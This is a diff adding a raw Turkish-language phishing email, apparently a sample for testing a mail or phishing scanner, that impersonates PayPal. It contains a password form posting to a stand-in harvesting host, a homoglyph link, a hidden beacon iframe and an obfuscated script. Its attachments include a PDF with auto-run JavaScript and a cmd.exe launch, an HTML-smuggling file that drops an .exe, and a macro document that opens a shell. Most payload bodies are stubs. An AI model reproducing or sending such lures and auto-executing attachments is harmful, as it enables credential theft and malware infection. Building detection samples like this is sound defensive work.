@@ -1,0 +1,87 @@
+From: PayPal Guvenlik <security@paypal.com.verify-account.tk>
+Reply-To: collect@evil-mirror.ru
+To: kurban@example.com
+Subject: Hesabiniz askiya alindi - hemen dogrulayin
+Date: Mon, 04 Aug 2025 09:12:00 +0300
+Authentication-Results: mx.example.com; spf=fail
+ smtp.mailfrom=paypal.com.verify-account.tk; dkim=none; dmarc=fail
+Received: from unknown ([45.146.164.110]) by mx.example.com; Mon, 04 Aug 2025
+ 09:12:00 +0300
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============5229930135803747542=="
+
+--===============5229930135803747542==
+Content-Type: multipart/alternative;
+ boundary="===============0870767669019427027=="
+
+--===============0870767669019427027==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hesabiniz askiya alindi. Dogrulamak icin baglantiya tiklayin.
+
+--===============0870767669019427027==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><head><base href=3D"http://cdn.evil-mirror.ru/"><meta http-equiv=3D"ref=
+resh" content=3D"30; url=3Dhttp://paypal-secure.tk/verify"></head><body><p>Sa=
+yin musteri, hesabiniz askiya alindi. 24 saat icinde dogrulayin.</p><form act=
+ion=3D"http://collect.evil-mirror.ru/harvest" method=3D"post">Sifre: <input t=
+ype=3D"password" name=3D"pw"> <input type=3D"submit" value=3D"Dogrula"></form=
+><a href=3D"http://paypal-secure.com/login">www.paypal.com</a><br><a href=3D"=
+http://p=D0=B0yp=D0=B0l.com/login">guvenli giris</a><iframe src=3D"http://bea=
+con.evil-mirror.ru/px" style=3D"display:none"></iframe><div style=3D"display:=
+none">legitimate bank notice legitimate bank notice legitimate bank notice le=
+gitimate bank notice legitimate bank notice legitimate bank notice legitimate=
+ bank notice legitimate bank notice legitimate bank notice legitimate bank no=
+tice legitimate bank notice legitimate bank notice legitimate bank notice leg=
+itimate bank notice legitimate bank notice legitimate bank notice legitimate =
+bank notice legitimate bank notice legitimate bank notice legitimate bank not=
+ice legitimate bank notice legitimate bank notice legitimate bank notice legi=
+timate bank notice legitimate bank notice </div><script>var p=3Datob("cGF5bG9=
+hZA=3D=3D");eval(unescape("%70%61"));document.write(p);</script></body></html>
+
+--===============0870767669019427027==--
+
+--===============5229930135803747542==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Fatura.pdf"
+MIME-Version: 1.0
+
+JVBERi0xLjcKMSAwIG9iajw8L09wZW5BY3Rpb248PC9TL0phdmFTY3JpcHQvSlMoYXBwLmxhdW5j
+aFVSTCgnaHR0cDovL2V2aWwudGsnKSk+Pi9MYXVuY2g8PC9GKGNtZC5leGUpPj4+PgplbmRvYmoK
+JSVFT0Y=
+
+--===============5229930135803747542==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Guncelleme.html"
+MIME-Version: 1.0
+
+PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgZD1hdG9iKCdRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtR
+VUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNF
+bEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVa
+SFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpE
+UlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtR
+VUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNF
+bEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVa
+SFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpE
+UlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEtRVUpEUlVaSFNFbEsn
+KTt2YXIgYj1uZXcgQmxvYihbZF0se3R5cGU6J2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSd9KTtt
+c1NhdmVPck9wZW5CbG9iKGIsJ0d1bmNlbGxlbWUuZXhlJyk7dmFyIGE9ZG9jdW1lbnQuY3JlYXRl
+RWxlbWVudCgnYScpO2EuZG93bmxvYWQ9J0d1bmNlbGxlbWUuZXhlJzthLmNsaWNrKCk7PC9zY3Jp
+cHQ+PC9ib2R5PjwvaHRtbD4=
+
+--===============5229930135803747542==
+Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Talimatlar.docm"
+MIME-Version: 1.0
+
+UEsDBBQAAAAAAAAAAAAAAAAAAAAAAHdvcmQvdmJhUHJvamVjdC5iaW4AACBTdWIgQXV0b09wZW4o
+KSBTaGVsbCgiY21kIikgRW5kIFN1YiA=
+
+--===============5229930135803747542==--
